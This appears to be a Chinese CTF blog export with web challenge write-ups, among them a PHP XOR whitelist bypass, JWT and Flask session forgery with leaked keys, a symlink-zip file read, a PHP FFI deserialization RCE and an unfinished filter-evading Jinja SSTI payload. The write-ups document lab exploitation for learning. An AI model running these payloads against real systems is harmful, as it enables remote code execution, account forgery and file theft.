<span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$whitelist</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="comment"># code...</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt; <span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="variable">$k</span> = <span class="number">0</span>;<span class="variable">$k</span> &lt; <span class="number">9</span>;<span class="variable">$k</span>++)&#123;</span><br><span class="line">                <span class="comment">// echo $value.&quot;\n&quot;;</span></span><br><span class="line">                <span class="comment">// echo ($j.$k).&quot;\n&quot;;</span></span><br><span class="line">                <span class="variable">$a</span> = (<span class="variable">$value</span> ^ <span class="variable">$j</span>.<span class="variable">$k</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$a</span> == <span class="string">&#x27;_G&#x27;</span> || <span class="variable">$a</span> == <span class="string">&#x27;ET&#x27;</span>)</span><br><span class="line">                    <span class="keyword">echo</span> <span class="variable">$value</span>.<span class="string">&quot;^&quot;</span>.(<span class="variable">$j</span>.<span class="variable">$k</span>).<span class="string">&quot; = <span class="subst">$a</span>&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">9</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">                    <span class="variable">$b</span> = <span class="variable">$value</span> ^ (<span class="variable">$j</span>.<span class="variable">$k</span>.<span class="variable">$i</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$b</span> == <span class="string">&#x27;SYS&#x27;</span> || <span class="variable">$b</span> == <span class="string">&#x27;GET&#x27;</span>)</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$value</span>.<span class="string">&quot;^&quot;</span>.(<span class="variable">$j</span>.<span class="variable">$k</span>.<span class="variable">$i</span>).<span class="string">&quot; = <span class="subst">$b</span>&quot;</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">// echo &quot;\n&quot;;</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment"># is_finite^64 = _G</span></span><br><span class="line"><span class="comment"># is_infinite^64 = _G</span></span><br><span class="line"><span class="comment"># is_nan^64 = _G</span></span><br><span class="line"><span class="comment"># mt_getrandmax^23 = _G</span></span><br><span class="line"><span class="comment"># mt_rand^23 = _G</span></span><br><span class="line"><span class="comment"># mt_srand^23 = _G</span></span><br><span class="line"><span class="comment"># rad2deg^75 = ET</span></span><br><span class="line"><span class="comment"># rand^75 = ET</span></span><br><span class="line"><span class="comment"># srand^475 = GET</span></span><br><span class="line"><span class="comment"># tan^15 = ET</span></span><br><span class="line"><span class="comment"># tanh^15 = ET</span></span><br></pre></td></tr></table></figure>

<p>最后选最短的几个来组成payload吧：（注意这里的64的类型要是字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=ls%20/</span><br></pre></td></tr></table></figure>

<p>之后cat一下就可以得到flag了</p>
<h4 id="BSidesCF-2019-Pick-Tac-Toe"><a href="#BSidesCF-2019-Pick-Tac-Toe" class="headerlink" title="[BSidesCF 2019]Pick Tac Toe"></a>[BSidesCF 2019]Pick Tac Toe</h4><p>打开靶机，不知道为什么点击没反应，F12之后发现cookie里面有session，但是base64解码之后只看出来了又sessionid，之后查看了一下源码，发现原来每个格子都对应着一个id</p>
<p><img src="https://img-blog.csdnimg.cn/67f21a816e3346db8c865c1dfeb09261.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>并且有<code>action=/move</code>而input标签可以利用move输入对应的值，那么随便试一下，好嘛，这不就是我们经常玩的井字棋嘛<img src="https://img-blog.csdnimg.cn/ba82e29e7954461e9be303f5d075062d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>那就直接选三个可以连起来的进行post传值就可以得到flag了</p>
<p>payload：（直接强制性传就好啦 即使br处出现了圆圈也不会有什么影响</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">move=c</span><br><span class="line">move=ul</span><br><span class="line">move=br</span><br></pre></td></tr></table></figure>

<h4 id="RootersCTF2019-ImgXweb"><a href="#RootersCTF2019-ImgXweb" class="headerlink" title="[RootersCTF2019]ImgXweb"></a>[RootersCTF2019]ImgXweb</h4><ul>
<li>jwt</li>
</ul>
<p>打开靶机，开始是登陆注册，先试一下admin万能密码登录，没有成功，注册admin发现admin用户已存在，那先随便注册一个账号进去吧</p>
<p>然后发现是文件上传，都试了一遍之后可以确定不是文件上传的漏洞了</p>
<p><img src="https://img-blog.csdnimg.cn/9116b9c5c52447c3a8fe11ef3dfcd4bd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>抓包之后发现cookie里面有sessionid，格式明显就是jwt，直接解码看看</p>
<p><img src="https://img-blog.csdnimg.cn/b9621411185b4f03a5346cc3756b175b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>说明我们可以伪造我们的身份为admin，然后进去看看，但是现在重点是怎么获得密钥</p>
<p>遇事不决，扫一下后台把，发现有robots.txt（太久没做题，导致有时候应该能直接自己试出来的东西要从头开始过了害</p>
<p><img src="https://img-blog.csdnimg.cn/1a490bf975cc483085c6479fbbf1163f.png" alt="img"></p>
<p>查看robots.txt之后可以得到密钥啦：<code>you-will-never-guess</code></p>
<p>直接解密之后加密，抓包放包：</p>
<p><img src="https://img-blog.csdnimg.cn/af8428d257eb4a7ab2255990f6d7bada.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>发现有flag.png，但是发现个问题，直接访问是得不到flag的，想到之前可以利用curl下载文件</p>
<p><img src="https://img-blog.csdnimg.cn/3d8a1e915f6f4a478d35f353cec9e4f7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>用curl试了好多命令之后，没想到直接curl url就可以得到flag了，还得继续学习curl的用途呢</p>
<p><img src="https://img-blog.csdnimg.cn/ec5ef169a68a42e5b67949a925b50a01.png" alt="img"></p>
<h4 id="SWPU2019-Web3"><a href="#SWPU2019-Web3" class="headerlink" title="[SWPU2019]Web3"></a>[SWPU2019]Web3</h4><ul>
<li>flask session伪造</li>
</ul>
<p>打开靶机，登录页面没有限制，登录进去之后有upload界面，但是没有权限，并且3秒之后自动返回首页，F12查看cookie之后发现有session值，格式很像jwt，但是jwt解码之后出现乱码，那也可能是flask session，用脚本强制解码之后可以得到：</p>
<p><img src="https://img-blog.csdnimg.cn/98135d0238f04408884d2484d82f84a6.png" alt="img"></p>
<p>其中，后面的username和password解码之后都是default，那么猜测如果把username改成admin会怎么样，但是没有密钥，那么试着看看robots.txt有没有提示，发现有这个文件，虽然返回了<code>404 not found</code>但是页面加载是200，说明是存在这个文件的，可以在F12之后发现某个特别的内容：</p>
<p><img src="https://img-blog.csdnimg.cn/2c3d0aa3044046fa8dafb9a84943a1cc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>base64解码之后得到密钥：（虽然不确定后面的那些符号是不是，先测试一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SECRET_KEY:keyqqqwwweee!@#$%^&amp;*</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/3aaeade9571a40fb9b2ce41770ed1dbc.png" alt="img"></p>
<p>可以发现是正确的呢，那就直接伪造啦（这里是试了好多次之后，都不对，看了别的师傅的wp之后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;id&#x27;: b&#x27;1&#x27;, &#x27;is_login&#x27;: True, &#x27;password&#x27;: &#x27;admin&#x27;, &#x27;username&#x27;: &#x27;admin&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>可以得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.eJyrVspMUbKqVlJIUrJS8g20tVWq1VHKLI7PyU_PzFOyKikqTdVRKkgsLi7PLwIqVEpMyQWK6yiVFqcW5SXmpsKFagFiyxgX.Yek0bA.1lnXSowFDjHbyuAnUGKfWtYEN84</span><br></pre></td></tr></table></figure>

<p>抓包修改之后就获得了文件上传的权限，看源码可以得到文件上传的python源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&#x27;id&#x27;</span>] != <span class="string">b&#x27;1&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template_string(temp)</span><br><span class="line">    <span class="keyword">if</span> request.method==<span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        m = hashlib.md5()</span><br><span class="line">        name = session[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        name = name+<span class="string">&#x27;qweqweqwe&#x27;</span></span><br><span class="line">        name = name.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        m.update(name)</span><br><span class="line">        md5_one= m.hexdigest()</span><br><span class="line">        n = hashlib.md5()</span><br><span class="line">        ip = request.remote_addr</span><br><span class="line">        ip = ip.encode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        n.update(ip)</span><br><span class="line">        md5_ip = n.hexdigest()</span><br><span class="line">        f=request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        basepath=os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        path = basepath+<span class="string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="string">&#x27;/&#x27;</span>+md5_one+<span class="string">&#x27;/&#x27;</span>+session[<span class="string">&#x27;username&#x27;</span>]+<span class="string">&quot;/&quot;</span></span><br><span class="line">        path_base = basepath+<span class="string">&#x27;/upload/&#x27;</span>+md5_ip+<span class="string">&#x27;/&#x27;</span></span><br><span class="line">        filename = f.filename</span><br><span class="line">        pathname = path+filename</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;zip&quot;</span> != filename.split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>]: <span class="comment"># 只能上传zip文件</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;zip only allowed&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path_base): <span class="comment"># 创建路径</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path_base)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                os.makedirs(path)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(pathname):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                f.save(pathname)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cmd = <span class="string">&quot;unzip -n -d &quot;</span>+path+<span class="string">&quot; &quot;</span>+ pathname</span><br><span class="line">            <span class="keyword">if</span> cmd.find(<span class="string">&#x27;|&#x27;</span>) != -<span class="number">1</span> <span class="keyword">or</span> cmd.find(<span class="string">&#x27;;&#x27;</span>) != -<span class="number">1</span>: <span class="comment"># 如果存在|或者;</span></span><br><span class="line">				waf()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">            os.system(cmd)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">        unzip_file = zipfile.ZipFile(pathname,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">        unzip_filename = unzip_file.namelist()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> session[<span class="string">&#x27;is_login&#x27;</span>] != <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;not login&#x27;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> unzip_filename.find(<span class="string">&#x27;/&#x27;</span>) != -<span class="number">1</span>:</span><br><span class="line">                shutil.rmtree(path_base)</span><br><span class="line">                os.mkdir(path_base)</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">            image = <span class="built_in">open</span>(path+unzip_filename, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">            resp = make_response(image)</span><br><span class="line">            resp.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/png&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            shutil.rmtree(path_base)</span><br><span class="line">            os.mkdir(path_base)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/showflag&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showflag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="literal">True</span> == <span class="literal">False</span>:</span><br><span class="line">        image = <span class="built_in">open</span>(os.path.join(<span class="string">&#x27;./flag/flag.jpg&#x27;</span>), <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">        resp = make_response(image)</span><br><span class="line">        resp.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/png&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;can&#x27;t give you&quot;</span></span><br></pre></td></tr></table></figure>

<p>可以知道upload路由里进行文件上传并且对文件解压缩之后查看文件内容</p>
<p>而showflag路由里面，由于if条件永假，所以我们无法通过该路由获取flag，但是这个路由告诉我们flag文件所在的路径<code>./flag/flag.jpg</code></p>
<p>之后看了别的师傅的wp：<a href="https://blog.csdn.net/SopRomeo/article/details/108334393">参考</a>这里提到了<a href="https://www.cnblogs.com/sueyyyy/p/10985443.html">软连接的使用</a></p>
<p>命令：（注意 这里的flag文件需要绝对路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ln -s /proc/self/cwd/flag/flag.jpg test</span><br><span class="line">zip -ry test.zip test</span><br></pre></td></tr></table></figure>

<p>上传文件，抓包得到flag</p>
<p><img src="https://img-blog.csdnimg.cn/d6568ca2918447169f9bdc80a110e0fd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="RCTF-2019-Nextphp"><a href="#RCTF-2019-Nextphp" class="headerlink" title="[RCTF 2019]Nextphp"></a>[RCTF 2019]Nextphp</h4><ul>
<li>php FFI扩展</li>
</ul>
<p>代码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先看看phpinfo里面给了我们什么信息，经典常用命令执行函数都被ban了</p>
<p><img src="https://img-blog.csdnimg.cn/e70fbdace5f043f8b31be121c1602434.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>随便尝试一下，很多函数例如var_dump,print_r,echo,file_get_contents,file_put_contents都没有被ban，还是有机会的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=var_dump(scandir(&#x27;.&#x27;));</span><br></pre></td></tr></table></figure>

<p>回显：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">array(4) &#123; [0]=&gt; string(1) &quot;.&quot; [1]=&gt; string(2) &quot;..&quot; [2]=&gt; string(9) &quot;index.php&quot; [3]=&gt; string(11) &quot;preload.php&quot; &#125;</span><br></pre></td></tr></table></figure>

<p>查看文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=file_get_contents(&quot;/var/www/html/preload.php&quot;);</span><br></pre></td></tr></table></figure>

<p>回显：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;print_r&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;ret&#x27;</span>] = <span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;func&#x27;</span>](<span class="keyword">$this</span>-&gt;data[<span class="string">&#x27;arg&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__serialize</span>(<span class="params"></span>): <span class="title">array</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unserialize</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">        array_merge(<span class="keyword">$this</span>-&gt;data, <span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span> (<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[<span class="variable">$key</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span> (<span class="params"><span class="variable">$key</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> \<span class="built_in">Exception</span>(<span class="string">&#x27;No implemented&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>虽然这里可以利用<code>$this-&gt;data[&#39;ret&#39;] = $this-&gt;data[&#39;func&#39;]($this-&gt;data[&#39;arg&#39;]);</code>来执行函数，但是最重要的还是很多函数被ban了</p>
<p>这里要用到php的一个扩展<a href="https://www.jianshu.com/p/c1f268aaf791/">FFI扩展</a>，它支持php调用c的代码</p>
<p>FFI::cdef([string ![cdef = “” <a href="https://math.jianshu.com/math?formula=cdef%20=%20%22%22%20%5B,%20string">, string</a>lib = null]]): FFI</p>
<p>所以可以构造poc：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [</span><br><span class="line">        <span class="string">&#x27;ret&#x27;</span> =&gt; <span class="literal">null</span>,</span><br><span class="line">        <span class="string">&#x27;func&#x27;</span> =&gt; <span class="string">&#x27;FFI:cdef&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;arg&#x27;</span> =&gt; <span class="string">&#x27;int system(char* command)&#x27;</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">serialize</span> (<span class="params"></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> serialize(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unserialize</span>(<span class="params"><span class="variable">$payload</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = unserialize(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;run();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"><span class="comment"># C%3A1%3A%22A%22%3A87%3A%7Ba%3A3%3A%7Bs%3A3%3A%22ret%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A8%3A%22FFI%3Acdef%22%3Bs%3A3%3A%22arg%22%3Bs%3A25%3A%22int+system%28char%2A+command%29%22%3B%7D%7D</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?a=unserialize(urldecode(&#x27;C%3A1%3A%22A%22%3A89%3A%7Ba%3A3%3A%7Bs%3A3%3A%22ret%22%3BN%3Bs%3A4%3A%22func%22%3Bs%3A9%3A%22FFI%3A%3Acdef%22%3Bs%3A3%3A%22arg%22%3Bs%3A26%3A%22int+system%28char+%2Acommand%29%3B%22%3B%7D%7D&#x27;))-&gt;__serialize()[&#x27;ret&#x27;]-&gt;system(&#x27;cat /flag&gt;/var/www/html/1.txt&#x27;);</span><br></pre></td></tr></table></figure>

<h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>第一周结束了，感觉学到的新知识也不是很多，很多遇到的新知识都没有彻底理解，下周效率要高一点了</p>
<p>~</p>
]]></content>
      <categories>
        <category>集训</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buu刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF2022 07赋能赛</title>
    <url>/2022/07/25/DASCTF2022-07%E8%B5%8B%E8%83%BD%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="队伍名称"><a href="#队伍名称" class="headerlink" title="队伍名称"></a>队伍名称</h1><p>TeamGipsy</p>
<h1 id="排名"><a href="#排名" class="headerlink" title="排名"></a>排名</h1><h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="Ez-to-getflag"><a href="#Ez-to-getflag" class="headerlink" title="Ez to getflag"></a>Ez to getflag</h3><p><img src="https://img-blog.csdnimg.cn/f8f84b60f3bb4ffe977d766ca69e1bfd.png" alt="img"></p>
<p>直接搜索/flag，得到flag</p>
<h3 id="Harddisk"><a href="#Harddisk" class="headerlink" title="Harddisk"></a>Harddisk</h3><blockquote>
<p>复现</p>
</blockquote>
<p>过滤了亿个字符，甚至<code>x|g</code>两个字母也被过滤了（人心险恶</p>
<p>一些关键词可以利用unicode编码绕过，因为print被过滤了所以这里的用curl外带。但是没有打通</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;%set%0apo=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;%set%0appp=dict(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;%set%0ahua=&quot;\u005f&quot;%&#125;</span><br><span class="line">&#123;%set%0aa=&quot;\u0067\u006c\u006f\u0062\u0061\u006c\u0073&quot;%&#125;</span><br><span class="line">&#123;%set%0ab=(hua,hua,a,hua,hua)|join%&#125;</span><br><span class="line">&#123;%set%0ao=dict(o=a,s=a)|join%&#125;</span><br><span class="line">&#123;%set%0aca=dict(ca=a,t=a)|join%&#125;</span><br><span class="line">&#123;%set%0aaop=&quot;\u0069\u006e\u0064\u0065\u0078&quot;%&#125;</span><br><span class="line">&#123;%set%0abin=(hua,hua,dict(built=a,ins=a)|join,hua,hua)|join%0a%&#125;</span><br><span class="line">&#123;%set%0acr=dict(ch=a,r=a)|join%&#125;</span><br><span class="line">&#123;%set%0ae=&quot;\u0067\u0065\u0074&quot;%&#125;</span><br><span class="line">&#123;%set%0alo=&quot;\u0067\u006c\u006f\u0062\u0061\u006c\u0073&quot;%&#125;</span><br><span class="line">&#123;%set%0aals=(hua,hua,lo,hua,hua)|join%&#125;</span><br><span class="line">&#123;%set%0achcr=(lipsum|attr(b))|attr(e)(bin)|attr(e)(cr)%&#125;</span><br><span class="line">&#123;%set%0af=chcr(47)%&#125;</span><br><span class="line">&#123;%set%0ard=dict(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;%set%0aspace=chcr(32)%0a%&#125;</span><br><span class="line">&#123;%set%0apt=chcr(46)%&#125;</span><br><span 